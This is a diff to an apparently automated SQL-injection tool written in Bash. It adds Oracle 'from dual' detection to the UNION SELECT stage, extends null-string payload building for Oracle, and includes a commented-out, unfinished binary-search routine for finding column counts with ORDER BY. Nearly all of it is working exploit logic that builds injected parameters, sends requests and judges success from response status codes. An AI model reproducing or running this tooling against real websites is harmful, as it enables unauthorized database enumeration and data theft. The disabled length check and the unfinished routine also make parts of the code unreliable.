@@ -86,6 +86,70 @@ while [[ $count -lt $columns ]] ; do
 done
 }
 
+#orderbyrequestbinchop()
+#TODO get this woking...
+#{
+#i=80
+#old=40
+#down=1
+#resp_error=0
+#while [[ $i -gt 0 ]] ; do
+#	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$i$end"`
+#	echo "Debug: $badparams#"
+#	echo "down: $down"
+#	if [[ "$resp_error" == "1" ]] ; then
+#		if [[ "$down" == "1" ]] ; then
+#			((i=$i/2))
+#		else #we are going upward
+#			((i=$i*2)) 
+#		fi
+#	else #we didnt get an error
+#		#first: store the old vaule:
+#		store=$old
+#		#test to see if we have got the right number of columns by issuing an order by one greater than i
+#		#if this gets an error, we have got the right answer
+#		((onemorethani=$i+1))  
+#		badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+order+by+$onemorethani$end"`
+#		requester
+#		statusX=`echo $response | cut -d ":" -f 1`
+#		lengthX=`echo $response | cut -d ":" -f 2`
+#		#have to store the old $request value
+#		oldrequest=$request
+#		if [[ "$statusX" != "200" ]] ; then	
+#			((colno=$i-1))
+#			echo -e '\E[31;48m'"\033[1m[ORDER BY: $i COL REQ:$K]\033[0m $oldrequest"
+#			tput sgr0 # Reset attributes.
+#			echo "[ORDER BY: $i COL REQ:$K] $oldrequest" >> ./output/$safefilename$safelogname.txt;
+#			success=1
+#			break 
+#		else # we havent got the right answer
+#			((i=$store*0.75))
+#		fi
+#	fi
+#	requester
+#	statusX=`echo $response | cut -d ":" -f 1`
+#	lengthX=`echo $response | cut -d ":" -f 2`
+#	if [[ "$status1" == "200" && "$status1" != "$statusX" ]] ; then 
+#		resp_error=1
+#		old=$i	
+#	else
+#		resp_error=0
+#	fi
+#	#elif [[ "$status1" == "200" && "$status1" == "$statusX" ]] ; then
+#	#	((length=$length1-$lengthx))
+#	#	if [[ $length -gt 4 || $length -lt -4 ]] then
+#	#	#this tries to account for apps that return a status 200 error page by measuring response length diffs
+#	#	((half_i=$i/2))
+#	#	((i=$i+$half_i))
+#	#else
+#	#	((i=$i/2))
+#	#if no error, we double the value
+#	if [[ $statusX == 200 ]] ; then
+#		((i=$i*2))
+#	fi
+#done
+#}
+
 orderby()
 {
 #function to determine the number of columns in a where clause
@@ -100,6 +164,7 @@ orderby()
 #this code looks at the exploit payload and tries to determine the SQLi metacharacters used:
 #was there a single quote at the begining? was there a comment char (- or #) at the end?
 #these may be needed to encapsulate our our 'order by x' payload for it to work 
+oracledb=0
 firstchar="${payload:1:1}"
 if [[ "$firstchar" == "'" ]] ; then	
 	quote="'"
@@ -186,6 +251,7 @@ fi
 
 unionselect()
 {
+echo "Running UNION SELECT tests" 
 #we need to create a string like union select null,null,null,null with a 'null,' for the colno (number of columns from the order by x) 
 ((nullcount=0))
 nullstring=""
@@ -221,13 +287,40 @@ badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select
 requester
 statusselY=`echo $response | cut -d ":" -f 1`
 lengthselY=`echo $response | cut -d ":" -f 2`
-
+selectsuccess=0
+#note that the response length check is disabled here by '|| $lengthselN != $lengthselN' 
+#this is to get things running based on status codes, then go to length diffing later
 if [[ $statusselY != $statusselN || $lengthselN != $lengthselN ]] ; then
-	#echo "UNION SELECT looks good! $request"
 	echo -e '\E[31;48m'"\033[1m[UNION SELECT: $colno COL REQ:$K]\033[0m $request"
 	tput sgr0 # Reset attributes.
 	echo "[UNION SELECT: $colno COL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
 	selectsuccess=1
+fi
+
+if [[ "$selectsuccess" == 0 ]] ; then
+	#try using a from dual - this might be an oracle db
+
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring$end"`
+	#echo "DEBUG right $badparams"
+	requester
+	statusselY=`echo $response | cut -d ":" -f 1`
+	lengthselY=`echo $response | cut -d ":" -f 2`
+
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring+from+dual$end"`
+	echo "DEBUG oracle $badparams"
+	requester
+	statusselDUAL=`echo $response | cut -d ":" -f 1`
+	lengthselDUAL=`echo $response | cut -d ":" -f 2`
+	#note that the response length check is disabled here by '|| $lengthselN != $lengthselN' 
+	#this is to get things running based on status codes, then go to length diffing later
+	if [[ $statusselDUAL == "200" && $statusselY != $statusselDUAL || $lengthselN != $lengthselN ]] ; then
+		#echo "UNION SELECT looks good! $request"
+		echo -e '\E[31;48m'"\033[1m[ORACLE DB DETECTED - FROM DUAL REQ:$K]\033[0m $request"
+		tput sgr0 # Reset attributes.
+			echo "[ORACLE DB DETECTED - FROM DUAL REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+		selectsuccess=1
+		oracledb=1
+	fi
 fi
 
 #if the union select worked, lets enumerate the data types
@@ -250,9 +343,17 @@ while [[ $selparamcount -le $colno ]] ; do
 		((nullcount=$nullcount+1))
 		if (($nullcount==$colno)) ; then
 			if (($nullcount==$selparamcount)) ; then
-				nullstring=$nullstring$selinject
+				if [[ $oracledb == 1 ]] ; then
+					nullstring=$nullstring$selinject"+from+dual"
+				else
+					nullstring=$nullstring$selinject
+				fi
 			else
-				nullstring=$nullstring"null"
+				if [[ $oracledb == 1 ]] ; then
+					nullstring=$nullstring"null+from+dual"
+				else	
+					nullstring=$nullstring"null"
+				fi
 			fi
 		else 
 			if (($nullcount==$selparamcount)) ; then
@@ -270,9 +371,17 @@ while [[ $selparamcount -le $colno ]] ; do
 		((nullcount=$nullcount+1))
 		if (($nullcount==$colno)) ; then
 			if (($nullcount==$selparamcount)) ; then
-				nullwrongstring=$nullwrongstring$selinject
+				if [[ $oracledb == 1 ]] ; then
+					nullwrongstring=$nullwrongstring$selinject"+from+dual"
+				else
+					nullwrongstring=$nullwrongstring$selinject
+				fi
 			else
-				nullwrongstring=$nullwrongstring"null"
+				if [[ $oracledb == 1 ]] ; then
+					nullwrongstring=$nullwrongstring"null+from+dual"
+				else
+					nullwrongstring=$nullwrongstring"null"
+				fi
 			fi
 		else 
 			if (($nullcount==$selparamcount)) ; then
